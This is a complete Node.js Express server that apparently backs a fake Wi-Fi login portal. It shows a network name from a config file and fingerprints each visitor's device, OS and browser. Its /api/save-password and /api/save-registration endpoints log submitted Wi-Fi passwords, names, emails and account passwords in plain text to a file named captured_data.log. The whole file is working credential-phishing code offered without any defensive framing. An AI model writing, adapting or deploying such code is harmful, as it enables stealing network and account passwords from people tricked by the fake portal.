import express from 'express';
import fs from 'fs';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const loggedClients = new Set();
const capturedPasswords = new Set();


app.use(cors());
app.use(express.json());

// ✅ SERVE REACT DIST
app.use(express.static(path.join(__dirname, 'dist')));

// ===============================
// DEVICE INFO PARSER
// ===============================
const getDeviceInfo = (ua = '') => {
    let os = 'Unknown OS';
    let osVersion = 'Unknown';
    let device = 'Unknown Device';
    let browser = 'Unknown Browser';
    let browserVersion = 'Unknown';

    // ---- OS & DEVICE ----
    if (ua.includes('Android')) {
        os = 'Android';
        const v = ua.match(/Android\s([\d.]+)/);
        if (v) osVersion = v[1];

        const m = ua.match(/Android.*;\s([^)]+)\)/);
        if (m) device = m[1];
    } 
    else if (ua.includes('iPhone')) {
        os = 'iOS';
        device = 'iPhone';
    } 
    else if (ua.includes('Windows')) {
        os = 'Windows';
        device = 'PC';
    } 
    else if (ua.includes('Macintosh')) {
        os = 'macOS';
        device = 'Mac';
    }

    // ---- BROWSER ----
    if (ua.includes('Chrome') && !ua.includes('Edg')) {
        browser = 'Chrome';
        browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown';
    }
    else if (ua.includes('Firefox')) {
        browser = 'Firefox';
        browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown';
    }
    else if (ua.includes('Safari') && !ua.includes('Chrome')) {
        browser = 'Safari';
    }
    else if (ua.includes('Edg')) {
        browser = 'Edge';
        browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown';
    }

    return { os, osVersion, device, browser, browserVersion };
};

// ===============================
// NETWORK INFO
// ===============================
app.get('/api/network-info', (req, res) => {
    const ip = req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const info = getDeviceInfo(ua);
    const time = new Date().toLocaleTimeString();
    const logPath = path.join(__dirname, 'captured_data.log');

    if (!loggedClients.has(ip)) {
        loggedClients.add(ip);

        fs.appendFileSync(
            logPath,
            `${time} | DEVICE: ${info.device}\n` +
            `${time} | OS: ${info.os} ${info.osVersion}\n` +
            `${time} | BROWSER: ${info.browser} ${info.browserVersion}\n`
        );
    }

    const configPath = path.join(__dirname, 'network_config.json');
    const configData = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    res.json({ ssid: configData.ssid || 'Guest Network' });
});


// ===============================
// SAVE PASSWORD
// ===============================
app.post('/api/save-password', (req, res) => {
    const ip = req.socket.remoteAddress;
    const password = req.body.password;

    if (!capturedPasswords.has(ip)) {
        capturedPasswords.add(ip);

        fs.appendFileSync(
            path.join(__dirname, 'captured_data.log'),
            `${new Date().toLocaleTimeString()} | PASSWORD: ${password}\n`
        );
    }

    res.json({ ok: true });
});


// ===============================
// SAVE REGISTRATION
// ===============================
app.post('/api/save-registration', (req, res) => {
    const { name, email, password } = req.body;
    const time = new Date().toLocaleTimeString();
    const logPath = path.join(__dirname, 'captured_data.log');

    if (name) fs.appendFileSync(logPath, `${time} | NAME: ${name}\n`);
    if (email) fs.appendFileSync(logPath, `${time} | EMAIL: ${email}\n`);
    if (password) fs.appendFileSync(logPath, `${time} | PASSWORD: ${password}\n`);

    res.json({ ok: true });
});

// ===============================
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
